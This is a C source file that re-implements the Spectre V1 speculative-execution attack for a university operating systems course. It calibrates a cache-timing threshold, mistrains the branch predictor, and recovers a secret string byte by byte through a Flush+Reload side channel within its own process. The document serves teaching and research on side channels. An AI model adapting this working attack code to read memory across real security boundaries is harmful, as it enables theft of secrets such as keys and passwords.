/*********************************************************
 *
 * this is a re-implementation of the Spectre V1 attack
 * it as been posted in order to make it available for the 
 * Advanced Operating Systems course 
 * MS Degree in Computer Engineering
 * University of Rome Tor Vergata
 *
 * the lines of code for training the branch predictor are 
 * taken from the original attack example
 *
 * other parts are conceptually inspired to the original attack 
 * but follow a slightly different implementation
 *
 * in this version the user can store a string into an mmap-ed page
 * which will never be accessed after such storing (this code works
 * with string less than 4096 bytes in size but can be esily modified 
 * to cope with longer strings)
 *
 * branch misprediction in the speculative execution of the underlying
 * x86 processor will lead to infer the content of such a string
 *
 * a few parameters can be configured via macros in order to drive the execution
 *
 * for any comment or clarification please contact
 * Francesco Quaglia (francesco.quaglia@uniroma2.it)
 *
**********************************************************/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <signal.h>




#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif


char v[4096];//this is used for training the cache access latency predictor

//these are for training the cache-hit/miss latency predictor
#define TRIALS (1<<14)
#define TRAINING_TRIALS (1000)
#define CYCLES (256)

#define PAGE_SIZE 4096


//this is the max number of false negatives that we accept while
//discovring a single byte of the input string
//if no actual positive is found across such number of trials then the 
//byte is lost in the aattack
//clearly this parameter trades-off attack delay and attack success
#define RETRY_CYCLES (128)


#define AUDIT if(0)//just for enabling or disabling the audit on stdout


char *secret_area;//the area where the string to be indirectly read is stored

char *the_array;
char *the_address;
char aux_char;


unsigned long cumulative_no_flush, cumulative_flush;
unsigned long average_no_flush, average_flush;
unsigned long threshold;
unsigned long time1, time2;
int junk = 0;


int memory_reader(void * target_address){//this function prints the value of the bytes in secret_area without accessing them
	int i;
	int c;

	//now we go reading the probe array
	for(i=0;i<256;i++){

		time1 = __rdtscp( & junk);
		asm("lfence":::);
		c = the_array[i<<12];
		asm("lfence":::);
		time2 = __rdtscp( & junk);
		if( ((time2 - time1) < threshold) && (i!=0)){// we are not interestred on the 0-th page since this has been used for training
			printf("cache hit at probe-array page %03d - target address is %p - deduced secret char value is '0x%02x'='%c'\n",i,target_address,i,i);
			return 1;//success
		}
	}

	AUDIT
	printf("scan of the probe array concluded\n");

	//no hit found at a page different from the 0-th one 
	//we have probably exprienced a false negative
	return 0;

}


char temp = 'f';
unsigned int array1_size = 1;//we use a single memory location for mistraining the branch preditor

void side_effect_maker(size_t x){

	//this would never read at displacement greater than 0 (array1_size) in a committed run
	//after branch predition training you can actually use any displacement 
	//you would like to deduce the value of bytes in memory
	if (x< array1_size){
		temp = the_array[(secret_area[x])<<12];
	}

}



int main (int argc, char**argv){

	int i,j;
	unsigned int z;
	char c;
	int ret;
	long int distance;
	size_t training_x, x, malicious_x;
	int residual_retries;
	int bytes_to_infer;


	//one page is used as auxiliary buffer - the other actually keeps the secret word
	secret_area = mmap(NULL, 2*PAGE_SIZE, PROT_WRITE, MAP_ANONYMOUS| MAP_PRIVATE, 0 , 0);  	
	if (!secret_area){
		printf("secret area install error\n");
		return - 1;
	}

	AUDIT
	printf("secret area installed at address %u\n",secret_area);

	secret_area[0] = '\0'; //materialize the 0-th page of the area - special value 0 is exploited in the cache-side channel inspection
	secret_area[PAGE_SIZE] = 'f'; //materialize the 1-st page of the area

	printf("give me the secret word: ");
	fflush(stdout);
	ret = scanf("%s",(secret_area+PAGE_SIZE));//we store on page number 1

	if (ret == EOF){
		printf("secret word input error\n");
		return - 1;
	}

	for(i=0;i<strlen(secret_area+PAGE_SIZE);i++){
		printf("numerical codes for the stored characters: '0X%02x' = '%c'\n",secret_area[i+4096],secret_area[i+4096]);
	}
	printf("secret word safely stored\n");

	bytes_to_infer = strlen(secret_area+PAGE_SIZE);

	AUDIT
	printf("%s",secret_area+PAGE_SIZE);
	//NOTE: from now on we will no longer access this area in any committed run - but we will infer its content via branch misprediction
	fflush(stdout);


	//this is a training phase for cache-hit/miss latency discovery
	j = 0;

	while(1){
	
		cumulative_no_flush = 0;
		cumulative_flush = 0;

		for(i=0;i<PAGE_SIZE;i++){
			    v[i] = 'f';
		}
	
		c = v[0];
	
		for(i=0;i<TRIALS;i++){
			time1 = __rdtscp( & junk);
			asm("lfence":::);
			c = v[0];
			asm("lfence":::);
			time2 = __rdtscp( & junk);
			cumulative_no_flush += time2 - time1;;
		}
		for(i=0;i<TRIALS;i++){
			_mm_clflush(v);
			time1 = __rdtscp( & junk);
			asm("lfence":::);
			c = v[0];
			asm("lfence":::);
			time2 = __rdtscp( & junk);
			cumulative_flush += time2 - time1;;
		}
		
		AUDIT
		printf("no flush time is %u - flush time is %u\n",cumulative_no_flush/TRIALS, cumulative_flush/TRIALS);
		average_no_flush += cumulative_no_flush/TRIALS;
		average_flush += cumulative_flush/TRIALS;

		if(++j >= TRAINING_TRIALS){
			average_no_flush = average_no_flush/TRAINING_TRIALS;
			average_flush = average_flush/TRAINING_TRIALS;

			printf("training over - average flush is %u average no flush is %u\n",average_flush, average_no_flush);
			threshold = average_no_flush + ((average_flush - average_no_flush)>>1) ; 

			printf("training over - threshold latency for cache hit/miss discrimination is %u\n",threshold);
			break;
		}

	}	
	//end of the training phase


	the_array = mmap(NULL, 256* PAGE_SIZE, PROT_WRITE, MAP_ANONYMOUS| MAP_PRIVATE, 0 , 0);  	
	if (!the_array){
		printf("probe buffer install error\n");
		return - 1;
	}

	AUDIT
	printf("probe buffer is at address %u\n",the_array);

	//materializing the probe buffer in memory
	for(i=0; i< 256*PAGE_SIZE; i++){
		the_array[i] = 'f';
	}
				

	//now we actually start the attack!!
	printf("now we start the indirect memory reading attack via branch misprediction\n");
	

	for(z=0;z<bytes_to_infer;z++){

		residual_retries = RETRY_CYCLES;//trying the side effect multiple times for a same target memory byte in order to try to bypass false negatives

retry:
		training_x = z ^ z;//the O-th entry of the probe array is our target for branch prediction training
		malicious_x = z+PAGE_SIZE;//here we speculatively move along the page containing the secret word


		//flushing the array from the cache 
		for(i=0; i< 256*PAGE_SIZE; i++){
			_mm_clflush(the_array+i);
		}



		AUDIT
		printf("cache flush done\n");


		for(j = 29; j >= 0 ; j--){

			AUDIT{
				printf("cyle %d of the attack\n",j);
				fflush(stdout);
			}

			_mm_clflush(&array1_size);
			asm("mfence":::);

			//start of code block litterally taken by the orginal Spectre code
			//here we are essentially selecting training_x (namely 0 in our implementation)
			//or malicious_x if j is not (or is) a multiple of 6
			x = ((j % 6) - 1 )  & ~0xFFFF;
			x = (x | (x >> 16));
			x = training_x ^ (x & (malicious_x ^ training_x));
			//end of the code block literally taken by the orignal Spectre code


			side_effect_maker(x);//we call the function containing the victim branch

		}
	
		if(!memory_reader(secret_area+malicious_x) && (residual_retries>0)) goto retry;

	}



}

